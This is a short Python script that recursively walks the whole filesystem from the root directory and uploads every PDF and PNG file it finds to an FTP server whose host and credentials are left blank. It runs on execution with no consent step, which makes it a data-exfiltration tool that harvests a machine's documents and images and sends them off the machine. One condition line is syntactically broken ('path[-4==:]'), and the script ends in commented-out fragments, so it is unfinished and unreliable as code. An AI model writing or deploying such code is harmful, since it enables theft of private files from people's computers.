import os




rootdir = '/'

from ftpretty import ftpretty

def ftp_upload(file_path):
    host = ''
    user = '' 
    password = ''
   
    f = ftpretty(host, user, password )
    f.put(file_path , '/')



def get_files():
    #f = open("demofile2.txt", "a")

    for subdir, dirs, files in os.walk(rootdir):
        for file in files:
            path = os.path.join(subdir, file) 
            print(path)
            if(path[-4==:] == '.pdf'):
                ftp_upload(path)
            if(path[-4:] == '.png'):
                ftp_upload(path)
            
            #f.write("\n" + path)

            #have to go to next function

    #f.close()



get_files()




#file = open("demofile2.txt",'rb') 
#ftp.storbinary("STOR " + file, open(file, "rb"))
#file.close()                                   
#ftp.quit() 

